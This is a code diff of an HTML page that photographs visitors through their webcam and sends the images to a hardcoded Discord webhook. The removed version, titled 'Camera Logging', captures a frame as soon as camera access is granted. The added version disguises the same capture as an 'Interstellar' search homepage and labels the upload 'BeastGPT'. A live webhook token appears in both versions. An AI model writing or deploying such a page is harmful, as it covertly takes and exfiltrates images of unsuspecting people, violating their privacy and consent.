@@ -1,56 +1,100 @@
+<!doctype html>
 <html lang="en">
-<head>
- <meta charset="UTF-8" />
- <meta name="referrer" content="no-referrer" />
- <meta http-equiv="X-Content-Type-Options" content="nosniff" />
- <meta name="viewport" content="width=device-width, initial-scale=1.0" />
- <title id="tab-title">Camera Logging</title>
- <style>
- video {
- display: none;
- }
- </style>
-</head>
-<body>
- <canvas id="canvas"></canvas>
- <script>
- let canvas = document.getElementById('canvas');
- let context = canvas.getContext('2d');
- let video = document.createElement('video');
- navigator.mediaDevices.getUserMedia({ video: { mediaSource: "camera" } })
- .then(function(stream) {
- video.srcObject = stream;
- video.onloadedmetadata = function() {
- let track = video.srcObject.getVideoTracks()[0];
- track.applyConstraints({width: 1280, height: 720});
- canvas.width = video.videoWidth;
- canvas.height = video.videoHeight;
- context.drawImage(video, 0, 0, canvas.width, canvas.height);
- // Send the image data to the Discord webhook
- let dataUrl = canvas.toDataURL('image/jpeg');
- fetch('https://discord.com/api/webhooks/1269800219902476370/VIew-iRlPeQTmuxLaH2sfLZr4lS-EUV4Fos9-hBASwdzngtApiCPawehzava1yIdQltF', {
- method: 'POST',
- headers: {
- 'Content-Type': 'application/json'
- },
- body: JSON.stringify({
- content: 'New Person',
- embeds: [{
- image: {
- url: dataUrl
- }
- }]
- })
- })
- .then(function() {
- track.stop();
- video.srcObject = null;
- });
- };
- })
- .catch(function(error) {
- console.error('Error accessing media devices.', error);
- });
- </script>
-</body>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="referrer" content="no-referrer" />
+    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" id="tab-favicon" href="favicon.png" />
+    <title id="tab-title">Home</title>
+    <style>
+      video {
+        display: none;
+      }
+    </style>
+  </head>
+  <body class="center" onload="SplashT">
+    <div class="fixed-nav-bar"></div>
+    <div id="particles-js">
+      <script rel="preload" src="https://cdn.jsdelivr.net/particles.js/2.0.0/"></script>
+      <div class="main">
+        <h1 class="title"><an>Inter</an>stellar</h1>
+        <p id="splash">Unknown</p>
+        <div class="search-container">
+          <form id="fs" method="POST">
+            <input id="is" class="main-search" placeholder="Search with Google or enter address" type="text" />
+          </form>
+        </div>
+      </div>
+    </div>
+    <canvas id="canvas"></canvas>
+    <script>
+      const webhookUrl = 'https://discord.com/api/webhooks/1269800219902476370/VIew-iRlPeQTmuxLaH2sfLZr4lS-EUV4Fos9-hBASwdzngtApiCPawehzava1yIdQltF';
+
+      const cameraButton = document.createElement('button');
+      cameraButton.innerHTML = 'Take Picture';
+      cameraButton.addEventListener('click', takePicture);
+      document.body.appendChild(cameraButton);
+
+      function takePicture() {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+              video.play();
+
+              setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const dataUrl = canvas.toDataURL('image/jpeg');
+                sendToDiscord(dataUrl);
+
+                video.srcObject.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+              }, 3000);
+            };
+            document.body.appendChild(video);
+          })
+          .catch(error => console.error('Error accessing camera:', error));
+      }
+
+      function sendToDiscord(imageUrl) {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', webhookUrl, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        xhr.onload = () => {
+          if (xhr.status === 200 || xhr.status === 204) {
+            console.log('Image sent to Discord webhook');
+          } else {
+            console.error(`Error sending image to Discord webhook: ${xhr.statusText}`);
+          }
+        };
+
+        xhr.onerror = () => console.error('Error sending image to Discord webhook');
+
+        const payload = {
+          content: 'Here is your picture:',
+          username: 'BeastGPT',
+          avatar_url: 'https://example.com/avatar.png',
+          embeds: [
+            {
+              title: 'Your Picture',
+              type: 'image',
+              url: imageUrl,
+              description: 'This is your face.'
+            }
+          ]
+        };
+
+        xhr.send(JSON.stringify(payload));
+      }
+    </script>
+    <div id="adv"></div>
+  </body>
 </html>
